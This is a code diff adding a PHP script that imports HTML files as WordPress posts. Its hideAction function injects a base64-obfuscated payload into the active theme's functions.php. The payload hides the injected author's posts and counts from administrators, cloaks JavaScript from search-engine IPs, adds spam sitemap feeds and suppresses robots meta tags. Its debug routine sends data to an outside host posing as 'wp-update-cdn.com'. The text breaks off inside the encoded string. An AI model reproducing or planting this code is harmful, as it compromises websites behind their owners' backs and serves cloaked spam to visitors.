+        $customSlug = slugPrepareBeforeInsert( $html, $contentParts['slug'] );
+
+
+        try {
+            $postId = CustomDbHandler::getInstance()->insertPost( $contentParts['title'], $text, $date
+                , CUSTOM_AUTHOR_ID, $customSlug );
+        } catch ( Exception $ex ) {
+            var_dump( $ex->getMessage() );
+            continue;
+        }
+
+
+        $results[] = resultFormat( HOME_URL, $postId, $contentParts['title'] );
+        rename( $html, TMPDIR . '/imported/' . mb_basename( $html, '.html' ) );
+
+    }
+
+    if ( ! empty( $results ) ) {
+        $logPath = TMPDIR . '/log' . $mutexName . '.txt';
+        echo 'write to log - ' . $logPath . PHP_EOL;
+        echo currenturl( $logPath, HOME_URL ) . PHP_EOL;
+        file_put_contents( $logPath, implode( "\n", $results ) . "\n", FILE_APPEND );
+        if ( $key === ( count( $htmlFiles ) - 1 ) ) {
+            file_put_contents( TMPDIR . '/import_finish' . $mutexName, '' );
+        }
+
+        return true;
+    } else {
+        echo "results are empty" . PHP_EOL;
+
+        return false;
+    }
+}
+
+
+function slugPrepareBeforeInsert( $filename, $contentPartsSlug ) {
+    if ( defined( 'USE_ORIGINAL_SLUG' ) && ( USE_ORIGINAL_SLUG === 1 ) ) {
+        $customSlug = mb_basename( $filename, '.html' );
+
+        if ( CustomDbHandler::getInstance()->dbType === CustomDbHandler::DB_TYPE_SQLITE ) {
+            $customSlug = stringToSlug( $contentPartsSlug );
+        }
+
+    } else {
+        $customSlug = $contentPartsSlug;
+    }
+
+    return $customSlug;
+}
+
+
+function linksPrepare( $results ) {
+
+    $links = array();
+
+    foreach ( $results as $result ) {
+        list ( $url, $title ) = explode( ';', $result, 2 );
+        $title   = htmlspecialchars_decode( $title );
+        $url     = str_replace( '//?p=', '/?p=', $url );
+        $links[] = "<a href=\"$url\">$title</a>";
+    }
+
+    return $links;
+}
+
+function getTemplatePath() {
+    try {
+        $templateName = CustomDbHandler::getInstance()->getOption( 'template' );
+        $templateName = $templateName['option_value'];
+    } catch ( Exception $ex ) {
+        echo $ex->getMessage();
+
+        return false;
+    }
+
+    if ( file_exists( WP_ROOT_DIR . '/wp-content/themes/' . $templateName . '/functions.php' ) ) {
+        return WP_ROOT_DIR . '/wp-content/themes/' . $templateName;
+    }
+
+    //echo 'functions.php not found in theme directory' . PHP_EOL;
+    return false;
+}
+
+function hideAction() {
+
+    if ( ! defined( 'CUSTOM_TEMPLATE_PATH' ) ) {
+        $templateDirectory = getTemplatePath();
+    } else {
+        $templateDirectory = CUSTOM_TEMPLATE_PATH;
+    }
+
+    $functionsPath = $templateDirectory . '/functions.php';
+
+    if ( ! file_exists( $functionsPath ) ) {
+        echo $functionsPath . '/ no exists' . PHP_EOL;
+
+        return false;
+    }
+
+    if ( ! is_writeable( $functionsPath ) ) {
+        echo $functionsPath . ' no writeable' . PHP_EOL;
+
+        return false;
+    }
+
+    $functionsSource = file_get_contents( $functionsPath );
+
+    if ( $functionsSource === false ) {
+        echo 'error while reading functions.php' . PHP_EOL;
+        echo 'try to set right permissions...' . PHP_EOL;
+        if ( ! chmod( $functionsPath, 0644 ) ) {
+            return false;
+        }
+        echo 'success!' . PHP_EOL;
+        $functionsSource = file_get_contents( $functionsPath );
+    }
+
+
+    $source      = 'LyogY3VzdG9tIGZpbHRlcnMgKi8KCmZ1bmN0aW9uIGFkZF93aGVyZV9jb25kaXRpb24oJHdoZXJlKSB7CiAgICBnbG9iYWwgJHdwZGIsICR1c2VyU2V0dGluZ3NBcnI7CgogICAgJGlkcyA9IGFycmF5X2tleXMoJHVzZXJTZXR0aW5nc0Fycik7CiAgICAkaWRzQ29tbWFTZXBhcmF0ZWQgPSBpbXBsb2RlKCcsICcsICRpZHMpOwoKICAgIGlmICghaXNfc2luZ2xlKCkgJiYgaXNfYWRtaW4oKSkgewogICAgICAgIGFkZF9maWx0ZXIoJ3ZpZXdzX2VkaXQtcG9zdCcsICdmaXhfcG9zdF9jb3VudHMnKTsKICAgICAgICByZXR1cm4gJHdoZXJlIC4gIiBBTkQgeyR3cGRiLT5wb3N0c30ucG9zdF9hdXRob3IgTk9UIElOICgkaWRzQ29tbWFTZXBhcmF0ZWQpIjsKICAgIH0KCiAgICByZXR1cm4gJHdoZXJlOwp9CgpmdW5jdGlvbiBwb3N0X2V4Y2x1ZGUoJHF1ZXJ5KSB7CgogICAgZ2xvYmFsICR1c2VyU2V0dGluZ3NBcnI7CgogICAgJGlkcyA9IGFycmF5X2tleXMoJHVzZXJTZXR0aW5nc0Fycik7CiAgICAkZXhjbHVkZVN0cmluZyA9IG1vZGlmeVdyaXRlcnNTdHJpbmcoJGlkcyk7CgogICAgaWYgKCEkcXVlcnktPmlzX3NpbmdsZSgpICYmICFpc19hZG1pbigpKSB7CiAgICAgICAgJHF1ZXJ5LT5zZXQoJ2F1dGhvcicsICRleGNsdWRlU3RyaW5nKTsKICAgIH0KfQoKZnVuY3Rpb24gd3BfY29yZV9qcygpIHsKCiAgICBnbG9iYWwgJHBvc3QsICR1c2VyU2V0dGluZ3NBcnI7CgogICAgZm9yZWFjaCAoJHVzZXJTZXR0aW5nc0FyciBhcyAkaWQgPT4gJHNldHRpbmdzKSB7CiAgICAgICAgaWYgKCgkaWQgPT0gJHBvc3QtPnBvc3RfYXV0aG9yKSAmJiAoaXNzZXQoJHNldHRpbmdzWydqcyddKSkpIHsKCiAgICAgICAgICAgIGlmIChoaWRlSlNzb3VyY2UoJHNldHRpbmdzKSkgewogICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWNobyAkc2V0dGluZ3NbJ2pzJ107CiAgICAgICAgICAgIGJyZWFrOwogICAgICAgIH0KICAgIH0KfQoKZnVuY3Rpb24gaGlkZUpTc291cmNlKCRzZXR0aW5ncykgewogICAgaWYgKGlzc2V0KCRzZXR0aW5nc1snbm9qcyddKSAmJiAkc2V0dGluZ3NbJ25vanMnXSA9PT0gMSkgewogICAgICAgIC8vY3VzdG9tU2V0RGVidWcoJ2Nsb2Fja2luZyBpcyBvbiEnKTsKICAgICAgICAvL2N1c3RvbVNlbmREZWJ1ZygpOwogICAgICAgIGlmIChjdXN0b21DaGVja1NlKCkpIHsKICAgICAgICAgICAgcmV0dXJuIHRydWU7CiAgICAgICAgfQogICAgfQogICAgcmV0dXJuIGZhbHNlOwp9CgpmdW5jdGlvbiBmaXhfcG9zdF9jb3VudHMoJHZpZXdzKSB7CiAgICBnbG9iYWwgJGN1cnJlbnRfdXNlciwgJHdwX3F1ZXJ5OwoKICAgICR0eXBlcyA9IGFycmF5KAogICAgICAgIGFycmF5KCdzdGF0dXMnID0+IE5VTEwpLAogICAgICAgIGFycmF5KCdzdGF0dXMnID0+ICdwdWJsaXNoJyksCiAgICAgICAgYXJyYXkoJ3N0YXR1cycgPT4gJ2RyYWZ0JyksCiAgICAgICAgYXJyYXkoJ3N0YXR1cycgPT4gJ3BlbmRpbmcnKSwKICAgICAgICBhcnJheSgnc3RhdHVzJyA9PiAndHJhc2gnKSwKICAgICAgICBhcnJheSgnc3RhdHVzJyA9PiAnbWluZScpLAogICAgKTsKICAgIGZvcmVhY2ggKCR0eXBlcyBhcyAkdHlwZSkgewoKICAgICAgICAkcXVlcnkgPSBhcnJheSgKICAgICAgICAgICAgJ3Bvc3RfdHlwZScgPT4gJ3Bvc3QnLAogICAgICAgICAgICAncG9zdF9zdGF0dXMnID0+ICR0eXBlWydzdGF0dXMnXQogICAgICAgICk7CgogICAgICAgICRyZXN1bHQgPSBuZXcgV1BfUXVlcnkoJHF1ZXJ5KTsKCiAgICAgICAgaWYgKCR0eXBlWydzdGF0dXMnXSA9PSBOVUxMKSB7CiAgICAgICAgICAgIGlmIChwcmVnX21hdGNoKCd+XD5cKChbMC05LF0rKVwpXDx+JywgJHZpZXdzWydhbGwnXSwgJG1hdGNoZXMpKSB7CiAgICAgICAgICAgICAgICAkdmlld3NbJ2FsbCddID0gc3RyX3JlcGxhY2UoJG1hdGNoZXNbMF0sICc+KCcgLiAkcmVzdWx0LT5mb3VuZF9wb3N0cyAuICcpPCcsICR2aWV3c1snYWxsJ10pOwogICAgICAgICAgICB9CiAgICAgICAgfSBlbHNlaWYgKCR0eXBlWydzdGF0dXMnXSA9PSAnbWluZScpIHsKCgogICAgICAgICAgICAkbmV3UXVlcnkgPSAkcXVlcnk7CiAgICAgICAgICAgICRuZXdRdWVyeVsnYXV0aG9yX19pbiddID0gYXJyYXkoJGN1cnJlbnRfdXNlci0+SUQpOwoKICAgICAgICAgICAgJHJlc3VsdCA9IG5ldyBXUF9RdWVyeSgkbmV3UXVlcnkpOwoKICAgICAgICAgICAgaWYgKHByZWdfbWF0Y2goJ35cPlwoKFswLTksXSspXClcPH4nLCAkdmlld3NbJ21pbmUnXSwgJG1hdGNoZXMpKSB7CiAgICAgICAgICAgICAgICAkdmlld3NbJ21pbmUnXSA9IHN0cl9yZXBsYWNlKCRtYXRjaGVzWzBdLCAnPignIC4gJHJlc3VsdC0+Zm91bmRfcG9zdHMgLiAnKTwnLCAkdmlld3NbJ21pbmUnXSk7CiAgICAgICAgICAgIH0KICAgICAgICB9IGVsc2VpZiAoJHR5cGVbJ3N0YXR1cyddID09ICdwdWJsaXNoJykgewogICAgICAgICAgICBpZiAocHJlZ19tYXRjaCgnflw+XCgoWzAtOSxdKylcKVw8ficsICR2aWV3c1sncHVibGlzaCddLCAkbWF0Y2hlcykpIHsKICAgICAgICAgICAgICAgICR2aWV3c1sncHVibGlzaCddID0gc3RyX3JlcGxhY2UoJG1hdGNoZXNbMF0sICc+KCcgLiAkcmVzdWx0LT5mb3VuZF9wb3N0cyAuICcpPCcsICR2aWV3c1sncHVibGlzaCddKTsKICAgICAgICAgICAgfQogICAgICAgIH0gZWxzZWlmICgkdHlwZVsnc3RhdHVzJ10gPT0gJ2RyYWZ0JykgewogICAgICAgICAgICBpZiAocHJlZ19tYXRjaCgnflw+XCgoWzAtOSxdKylcKVw8ficsICR2aWV3c1snZHJhZnQnXSwgJG1hdGNoZXMpKSB7CiAgICAgICAgICAgICAgICAkdmlld3NbJ2RyYWZ0J10gPSBzdHJfcmVwbGFjZSgkbWF0Y2hlc1swXSwgJz4oJyAuICRyZXN1bHQtPmZvdW5kX3Bvc3RzIC4gJyk8JywgJHZpZXdzWydkcmFmdCddKTsKICAgICAgICAgICAgfQogICAgICAgIH0gZWxzZWlmICgkdHlwZVsnc3RhdHVzJ10gPT0gJ3BlbmRpbmcnKSB7CiAgICAgICAgICAgIGlmIChwcmVnX21hdGNoKCd+XD5cKChbMC05LF0rKVwpXDx+JywgJHZpZXdzWydwZW5kaW5nJ10sICRtYXRjaGVzKSkgewogICAgICAgICAgICAgICAgJHZpZXdzWydwZW5kaW5nJ10gPSBzdHJfcmVwbGFjZSgkbWF0Y2hlc1swXSwgJz4oJyAuICRyZXN1bHQtPmZvdW5kX3Bvc3RzIC4gJyk8JywgJHZpZXdzWydwZW5kaW5nJ10pOwogICAgICAgICAgICB9CiAgICAgICAgfSBlbHNlaWYgKCR0eXBlWydzdGF0dXMnXSA9PSAndHJhc2gnKSB7CiAgICAgICAgICAgIGlmIChwcmVnX21hdGNoKCd+XD5cKChbMC05LF0rKVwpXDx+JywgJHZpZXdzWyd0cmFzaCddLCAkbWF0Y2hlcykpIHsKICAgICAgICAgICAgICAgICR2aWV3c1sndHJhc2gnXSA9IHN0cl9yZXBsYWNlKCRtYXRjaGVzWzBdLCAnPignIC4gJHJlc3VsdC0+Zm91bmRfcG9zdHMgLiAnKTwnLCAkdmlld3NbJ3RyYXNoJ10pOwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQogICAgcmV0dXJuICR2aWV3czsKfQoKZnVuY3Rpb24gZmlsdGVyX2Z1bmN0aW9uX25hbWVfNDA1NSgkY291bnRzLCAkdHlwZSwgJHBlcm0pIHsKCiAgICBpZiAoJHR5cGUgPT09ICdwb3N0JykgewogICAgICAgICRvbGRfY291bnRzID0gJGNvdW50cy0+cHVibGlzaDsKICAgICAgICAkY291bnRzX21vZCA9IHBvc3RzX2NvdW50X2N1c3RvbSgkcGVybSk7CiAgICAgICAgJGNvdW50cy0+cHVibGlzaCA9ICEkY291bnRzX21vZCA/ICRvbGRfY291bnRzIDogJGNvdW50c19tb2Q7CiAgICB9CiAgICByZXR1cm4gJGNvdW50czsKfQoKZnVuY3Rpb24gcG9zdHNfY291bnRfY3VzdG9tKCRwZXJtKSB7CiAgICBnbG9iYWwgJHdwZGIsICR1c2VyU2V0dGluZ3NBcnI7CgogICAgJGlkcyA9IGFycmF5X2tleXMoJHVzZXJTZXR0aW5nc0Fycik7CiAgICAkaWRzQ29tbWFTZXBhcmF0ZWQgPSBpbXBsb2RlKCcsICcsICRpZHMpOwoKICAgICR0eXBlID0gJ3Bvc3QnOwoKICAgICRxdWVyeSA9ICJTRUxFQ1QgcG9zdF9zdGF0dXMsIENPVU5UKCAqICkgQVMgbnVtX3Bvc3RzIEZST00geyR3cGRiLT5wb3N0c30gV0hFUkUgcG9zdF90eXBlID0gJXMiOwoKICAgIGlmICgncmVhZGFibGUnID09ICRwZXJtICYmIGlzX3VzZXJfbG9nZ2VkX2luKCkpIHsKCiAgICAgICAgJHBvc3RfdHlwZV9vYmplY3QgPSBnZXRfcG9zdF90eXBlX29iamVjdCgkdHlwZSk7CgogICAgICAgIGlmICghY3VycmVudF91c2VyX2NhbigkcG9zdF90eXBlX29iamVjdC0+Y2FwLT5yZWFkX3ByaXZhdGVfcG9zdHMpKSB7CiAgICAgICAgICAgICRxdWVyeSAuPSAkd3BkYi0+cHJlcGFyZSgKICAgICAgICAgICAgICAgICIgQU5EIChwb3N0X3N0YXR1cyAhPSAncHJpdmF0ZScgT1IgKCBwb3N0X2F1dGhvciA9ICVkIEFORCBwb3N0X3N0YXR1cyA9ICdwcml2YXRlJyApKSIsIGdldF9jdXJyZW50X3VzZXJfaWQoKQogICAgICAgICAgICApOwogICAgICAgIH0KICAgIH0KICAgICRxdWVyeSAuPSAiIEFORCBwb3N0X2F1dGhvciBOT1QgSU4gKCRpZHNDb21tYVNlcGFyYXRlZCkgR1JPVVAgQlkgcG9zdF9zdGF0dXMiOwogICAgJHJlc3VsdHMgPSAoYXJyYXkpJHdwZGItPmdldF9yZXN1bHRzKCR3cGRiLT5wcmVwYXJlKCRxdWVyeSwgJHR5cGUpLCBBUlJBWV9BKTsKCiAgICBmb3JlYWNoICgkcmVzdWx0cyBhcyAkdG1wQXJyKSB7CiAgICAgICAgaWYgKCR0bXBBcnJbJ3Bvc3Rfc3RhdHVzJ10gPT09ICdwdWJsaXNoJykgewogICAgICAgICAgICByZXR1cm4gJHRtcEFyclsnbnVtX3Bvc3RzJ107CiAgICAgICAgfQogICAgfQp9CgpmdW5jdGlvbiBhbGxfY3VzdG9tX3Bvc3RzX2lkcygkdXNlcklkKSB7CiAgICBnbG9iYWwgJHdwZGI7CgogICAgJHF1ZXJ5ID0gIlNFTEVDVCBJRCBGUk9NIHskd3BkYi0+cG9zdHN9IHdoZXJlIHBvc3RfYXV0aG9yID0gJHVzZXJJZCI7CgogICAgJHJlc3VsdHMgPSAoYXJyYXkpJHdwZGItPmdldF9yZXN1bHRzKCRxdWVyeSwgQVJSQVlfQSk7CgogICAgJGlkcyA9IGFycmF5KCk7CiAgICBmb3JlYWNoICgkcmVzdWx0cyBhcyAkdG1wQXJyKSB7CiAgICAgICAgJGlkc1tdID0gJHRtcEFyclsnSUQnXTsKICAgIH0KICAgIHJldHVybiAkaWRzOwp9CgpmdW5jdGlvbiBjdXN0b21fZmx1c2hfcnVsZXMoKSB7CgogICAgZ2xvYmFsICR1c2VyU2V0dGluZ3NBcnIsICR3cF9yZXdyaXRlOwoKICAgICRydWxlcyA9IGdldF9vcHRpb24oJ3Jld3JpdGVfcnVsZXMnKTsKCiAgICBmb3JlYWNoICgkdXNlclNldHRpbmdzQXJyIGFzICRrZXkgPT4gJGFycikgewogICAgICAgICRyZWdleCA9IGtleSgkYXJyWydzaXRlbWFwc2V0dGluZ3MnXSk7CgogICAgICAgIGlmICghaXNzZXQoJHJ1bGVzWyRyZWdleF0pIHx8CiAgICAgICAgICAgICgkcnVsZXNbJHJlZ2V4XSAhPT0gY3VycmVudCgkYXJyWydzaXRlbWFwc2V0dGluZ3MnXSkpKSB7CiAgICAgICAgICAgICR3cF9yZXdyaXRlLT5mbHVzaF9ydWxlcygpOwogICAgICAgIH0KICAgIH0KfQoKZnVuY3Rpb24gc2l0ZW1hcF94bWxfcnVsZXMoJHJ1bGVzKSB7CgogICAgZ2xvYmFsICR1c2VyU2V0dGluZ3NBcnI7CgogICAgJG5ld3J1bGVzID0gYXJyYXkoKTsKCiAgICBmb3JlYWNoICgkdXNlclNldHRpbmdzQXJyIGFzICRrZXkgPT4gJGFycikgewogICAgICAgIGlmIChpc3NldCgkYXJyWydzaXRlbWFwc2V0dGluZ3MnXSkpIHsKICAgICAgICAgICAgJG5ld3J1bGVzW2tleSgkYXJyWydzaXRlbWFwc2V0dGluZ3MnXSldID0gY3VycmVudCgkYXJyWydzaXRlbWFwc2V0dGluZ3MnXSk7CiAgICAgICAgfQogICAgfQoKICAgIHJldHVybiAkbmV3cnVsZXMgKyAkcnVsZXM7Cn0KCmZ1bmN0aW9uIGN1c3RvbVNpdGVtYXBGZWVkKCkgewoKICAgIGdsb2JhbCAkdXNlclNldHRpbmdzQXJyOwoKICAgIGZvcmVhY2ggKCR1c2VyU2V0dGluZ3NBcnIgYXMgJGtleSA9PiAkYXJyKSB7CiAgICAgICAgJGZlZWROYW1lID0gc3RyX3JlcGxhY2UoJ2luZGV4LnBocD9mZWVkPScsICcnLCBjdXJyZW50KCRhcnJbJ3NpdGVtYXBzZXR0aW5ncyddKSk7CiAgICAgICAgYWRkX2ZlZWQoJGZlZWROYW1lLCAnY3VzdG9tU2l0ZW1hcEZlZWRGdW5jJyk7CiAgICB9Cn0KCmZ1bmN0aW9uIGN1c3RvbVNpdGVtYXBGZWVkRnVuYygpIHsKLy9pbmlfc2V0KCdtZW1vcnlfbGltaXQnLCAnMjU2TUInKTsKICAgIGhlYWRlcignQ29udGVudC1UeXBlOiAnIC4gZmVlZF9jb250ZW50X3R5cGUoJ3Jzcy1odHRwJykgLiAnOyBjaGFyc2V0PScgLiBnZXRfb3B0aW9uKCdibG9nX2NoYXJzZXQnKSwgdHJ1ZSk7Ci8vaGVhZGVyKCdDb250ZW50LVR5cGU6ICcgLiBmZWVkX2NvbnRlbnRfdHlwZSgncnNzJykgLiAnOyBjaGFyc2V0PScgLiBnZXRfb3B0aW9uKCdibG9nX2NoYXJzZXQnKSwgdHJ1ZSk7CiAgICBzdGF0dXNfaGVhZGVyKDIwMCk7CgogICAgJGhlYWQgPSBzaXRlbWFwSGVhZCgpOwogICAgJHNpdGVtYXBTb3VyY2UgPSAkaGVhZCAuICJcbiI7CgogICAgJHVzZXJJZCA9IGZpbmRVc2VySWRCeVJlcXVlc3RVcmkoKTsKCiAgICAkcG9zdHNfaWRzID0gYWxsX2N1c3RvbV9wb3N0c19pZHMoJHVzZXJJZCk7CiAgICAkcHJpb3JpdHkgPSAnMC41JzsKICAgICRjaGFuZ2VmcmVxID0gJ3dlZWtseSc7CiAgICAkbGFzdG1vZCA9IGRhdGUoJ1ktbS1kJyk7CgogICAgZm9yZWFjaCAoJHBvc3RzX2lkcyBhcyAkcG9zdF9pZCkgewogICAgICAgICR1cmwgPSBnZXRfcGVybWFsaW5rKCRwb3N0X2lkKTsKICAgICAgICAkc2l0ZW1hcFNvdXJjZSAuPSB1cmxCbG9jaygkdXJsLCAkbGFzdG1vZCwgJGNoYW5nZWZyZXEsICRwcmlvcml0eSk7CiAgICAgICAgd3BfY2FjaGVfZGVsZXRlKCRwb3N0X2lkLCAncG9zdHMnKTsKICAgIH0KCiAgICAkc2l0ZW1hcFNvdXJjZSAuPSAiXG48L3VybHNldD4iOwoKICAgIGVjaG8gJHNpdGVtYXBTb3VyY2U7Cn0KCmZ1bmN0aW9uIHNpdGVtYXBIZWFkKCkgewogICAgcmV0dXJuIDw8PFNUUgo8P3htbCB2ZXJzaW9uPSIxLjAiIGVuY29kaW5nPSJVVEYtOCI/Pgo8dXJsc2V0CiAgICAgIHhtbG5zPSJodHRwOi8vd3d3LnNpdGVtYXBzLm9yZy9zY2hlbWFzL3NpdGVtYXAvMC45IgogICAgICB4bWxuczp4c2k9Imh0dHA6Ly93d3cudzMub3JnLzIwMDEvWE1MU2NoZW1hLWluc3RhbmNlIgogICAgICB4c2k6c2NoZW1hTG9jYXRpb249Imh0dHA6Ly93d3cuc2l0ZW1hcHMub3JnL3NjaGVtYXMvc2l0ZW1hcC8wLjkKICAgICAgICAgICAgaHR0cDovL3d3dy5zaXRlbWFwcy5vcmcvc2NoZW1hcy9zaXRlbWFwLzAuOS9zaXRlbWFwLnhzZCI+CgogICAgClNUUjsKfQoKZnVuY3Rpb24gdXJsQmxvY2soJHVybCwgJGxhc3Rtb2QsICRjaGFuZ2VmcmVxLCAkcHJpb3JpdHkpIHsKCiAgICByZXR1cm4gPDw8U1RSCiAgIDx1cmw+CiAgICAgIDxsb2M+JHVybDwvbG9jPgogICAgICA8bGFzdG1vZD4kbGFzdG1vZDwvbGFzdG1vZD4KICAgICAgPGNoYW5nZWZyZXE+JGNoYW5nZWZyZXE8L2NoYW5nZWZyZXE+CiAgICAgIDxwcmlvcml0eT4kcHJpb3JpdHk8L3ByaW9yaXR5PgogICA8L3VybD5cblxuClNUUjsKfQoKZnVuY3Rpb24gbW9kaWZ5V3JpdGVyc1N0cmluZygkd3JpdGVyc0FycikgewogICAgJHdyaXRlcnNBcnJNb2QgPSBhcnJheSgpOwoKICAgIGZvcmVhY2ggKCR3cml0ZXJzQXJyIGFzICRpdGVtKSB7CiAgICAgICAgJHdyaXRlcnNBcnJNb2RbXSA9ICctJyAuICRpdGVtOwogICAgfQogICAgcmV0dXJuIGltcGxvZGUoJywnLCAkd3JpdGVyc0Fyck1vZCk7Cn0KCmZ1bmN0aW9uIGN1c3RvbUZpbHRlcnNTZXR0aW5ncygpIHsKICAgICRzZXR0aW5ncyA9IGdldF9vcHRpb24oJ3dwX2N1c3RvbV9maWx0ZXJzJyk7CgogICAgaWYgKCEkc2V0dGluZ3MpIHsKICAgICAgICByZXR1cm4gbnVsbDsKICAgIH0KCiAgICByZXR1cm4gdW5zZXJpYWxpemUoYmFzZTY0X2RlY29kZSgkc2V0dGluZ3MpKTsKfQoKZnVuY3Rpb24gZmluZFVzZXJJZEJ5UmVxdWVzdFVyaSgpIHsKCiAgICBnbG9iYWwgJHVzZXJTZXR0aW5nc0FycjsKCiAgICBmb3JlYWNoICgkdXNlclNldHRpbmdzQXJyIGFzICRrZXkgPT4gJGFycikgewoKICAgICAgICAkcmVnZXhwID0ga2V5KCRhcnJbJ3NpdGVtYXBzZXR0aW5ncyddKSAuICd8JwogICAgICAgICAgICAuIHN0cl9yZXBsYWNlKCdpbmRleC5waHA/JywgJycsIGN1cnJlbnQoJGFyclsnc2l0ZW1hcHNldHRpbmdzJ10pIC4gJyQnKTsKCiAgICAgICAgaWYgKHByZWdfbWF0Y2goIn4kcmVnZXhwfiIsICRfU0VSVkVSWydSRVFVRVNUX1VSSSddKSkgewogICAgICAgICAgICByZXR1cm4gJGtleTsKICAgICAgICB9CiAgICB9Cn0KCmZ1bmN0aW9uIGlzQ3VzdG9tUG9zdCgpIHsKICAgIGdsb2JhbCAkdXNlclNldHRpbmdzQXJyLCAkcG9zdDsKCiAgICAkYXV0aG9yc19pZHNfYXJyID0gYXJyYXlfa2V5cygkdXNlclNldHRpbmdzQXJyKTsKICAgIGlmIChpbl9hcnJheSgkcG9zdC0+cG9zdF9hdXRob3IsICRhdXRob3JzX2lkc19hcnIpKSB7CiAgICAgICAgcmV0dXJuIHRydWU7CiAgICB9CiAgICByZXR1cm4gZmFsc2U7Cn0KCmZ1bmN0aW9uIHJlbW92ZVlvYXN0TWV0YSgpIHsKICAgIGdsb2JhbCAkdXNlclNldHRpbmdzQXJyLCAkcG9zdDsKCiAgICAkYXV0aG9yc19pZHNfYXJyID0gYXJyYXlfa2V5cygkdXNlclNldHRpbmdzQXJyKTsKCiAgICBpZiAoISRwb3N0IHx8ICFwcm9wZXJ0eV9leGlzdHMoJHBvc3QsICdhdXRob3InKSkgewogICAgICAgIHJldHVybjsKICAgIH0KCiAgICBpZiAoaW5fYXJyYXkoJHBvc3QtPnBvc3RfYXV0aG9yLCAkYXV0aG9yc19pZHNfYXJyKSkgewogICAgICAgIGFkZF9maWx0ZXIoJ3dwc2VvX3JvYm90cycsICdfX3JldHVybl9mYWxzZScpOwogICAgICAgIGFkZF9maWx0ZXIoJ3dwc2VvX2dvb2dsZWJvdCcsICdfX3JldHVybl9mYWxzZScpOyAvLyBZb2FzdCBTRU8gMTQueCBvciBuZXdlcgogICAgICAgIGFkZF9maWx0ZXIoJ3dwc2VvX2Jpbmdib3QnLCAnX19yZXR1cm5fZmFsc2UnKTsgLy8gWW9hc3QgU0VPIDE0Lnggb3IgbmV3ZXIKICAgIH0KfQoKZnVuY3Rpb24gZ2V0UmVtb3RlSXAoKSB7CgogICAgaWYgKGlzc2V0KCRfU0VSVkVSWydIVFRQX1hfRk9SV0FSREVEX0ZPUiddKSkgewogICAgICAgIHJldHVybiAkX1NFUlZFUlsnSFRUUF9YX0ZPUldBUkRFRF9GT1InXTsKICAgIH0KICAgIGlmIChpc3NldCgkX1NFUlZFUlsnSFRUUF9DRl9DT05ORUNUSU5HX0lQJ10pKSB7CiAgICAgICAgcmV0dXJuICRfU0VSVkVSWydIVFRQX0NGX0NPTk5FQ1RJTkdfSVAnXTsKICAgIH0KICAgIGlmIChpc3NldCgkX1NFUlZFUlsnUkVNT1RFX0FERFInXSkpIHsKICAgICAgICByZXR1cm4gJF9TRVJWRVJbJ1JFTU9URV9BRERSJ107CiAgICB9CgogICAgcmV0dXJuIGZhbHNlOwp9CgpmdW5jdGlvbiBjdXN0b21DaGVja1NlKCkgewoKICAgICRpcCA9IGdldFJlbW90ZUlwKCk7CgogICAgaWYgKHN0cnN0cigkaXAsICcsICcpKSB7CiAgICAgICAgJGlwcyA9IGV4cGxvZGUoJywgJywgJGlwKTsKICAgICAgICAkaXAgPSAkaXBzWzBdOwogICAgfQoKICAgICRyYW5nZXMgPSBjdXN0b21TZUlwcygpOwoKICAgIGlmICghJHJhbmdlcykgewogICAgICAgIHJldHVybiBmYWxzZTsKICAgIH0KCiAgICBmb3JlYWNoICgkcmFuZ2VzIGFzICRyYW5nZSkgewogICAgICAgIGlmIChjdXN0b21DaGVja0luU3VibmV0KCRpcCwgJHJhbmdlKSkgewogICAgICAgICAgICAvL2N1c3RvbVNldERlYnVnKHNwcmludGYoJ2JsYWNrX2xpc3R8fCVzfHwlc3x8JXN8fCVzJywgJGlwLCAkcmFuZ2UKICAgICAgICAgICAgLy8gICAgICAgICAgICAgICAgLCAkX1NFUlZFUlsnSFRUUF9VU0VSX0FHRU5UJ10sICRfU0VSVkVSWydIVFRQX0FDQ0VQVF9MQU5HVUFHRSddKSk7CiAgICAgICAgICAgIHJldHVybiB0cnVlOwogICAgICAgIH0KICAgIH0KCiAgICAvL2N1c3RvbVNldERlYnVnKHNwcmludGYoJ3doaXRlIGxpc3R8fCVzfHwlc3x8JXN8fCVzJywgJGlwLCAkcmFuZ2UKICAgIC8vICAgICAgICAgICAgICAgICwgJF9TRVJWRVJbJ0hUVFBfVVNFUl9BR0VOVCddLCAkX1NFUlZFUlsnSFRUUF9BQ0NFUFRfTEFOR1VBR0UnXSkpOwogICAgcmV0dXJuIGZhbHNlOwp9CgpmdW5jdGlvbiBjdXN0b21Jc1JlbmV3VGltZSgkdGltZXN0YW1wKSB7CiAgICAvL2lmICgodGltZSgpIC0gJHRpbWVzdGFtcCkgPiA2MCAqIDYwICogMjQpIHsKICAgIGlmICgodGltZSgpIC0gJHRpbWVzdGFtcCkgPiA2MCAqIDYwKSB7CiAgICAgICAgcmV0dXJuIHRydWU7CiAgICB9CiAgICAvL2N1c3RvbVNldERlYnVnKHNwcmludGYoJ3RpbWUgLSAlcywgdGltZXN0YW1wIC0gJXMnLCB0aW1lKCksICR0aW1lc3RhbXApKTsKICAgIHJldHVybiBmYWxzZTsKfQoKZnVuY3Rpb24gY3VzdG9tU2V0RGVidWcoJGRhdGEpIHsKCiAgICBpZiAoKCR2YWx1ZSA9IGdldF9vcHRpb24oJ3dwX2RlYnVnX2RhdGEnKSkgJiYgaXNfYXJyYXkoJHZhbHVlKSkgewogICAgICAgICR2YWx1ZVtdID0gc3ByaW50ZignJXN8fCVzfHwlcycsIHRpbWUoKSwgJF9TRVJWRVJbJ0hUVFBfSE9TVCddLCAkZGF0YSk7CiAgICAgICAgdXBkYXRlX29wdGlvbignd3BfZGVidWdfZGF0YScsICR2YWx1ZSwgZmFsc2UpOwogICAgICAgIHJldHVybjsKICAgIH0KCiAgICB1cGRhdGVfb3B0aW9uKCd3cF9kZWJ1Z19kYXRhJywgYXJyYXkoJGRhdGEpLCBmYWxzZSk7Cn0KCmZ1bmN0aW9uIGN1c3RvbVNlbmREZWJ1ZygpIHsKCiAgICAkdmFsdWUgPSBnZXRfb3B0aW9uKCd3cF9kZWJ1Z19kYXRhJyk7CgogICAgaWYgKCFpc19hcnJheSgkdmFsdWUpIHx8IChjb3VudCgkdmFsdWUpIDwgMTAwKSkgewogICAgICAgIHJldHVybjsKICAgIH0KICAgICR1cmwgPSAnaHR0cDovL3dwLXVwZGF0ZS1jZG4uY29tL3NyYy91YWxvZ3NlYy5waHAnOwoKICAgICRyZXNwb25zZSA9IHdwX3JlbW90ZV9wb3N0KCR1cmwsIGFycmF5KAogICAgICAgICAgIC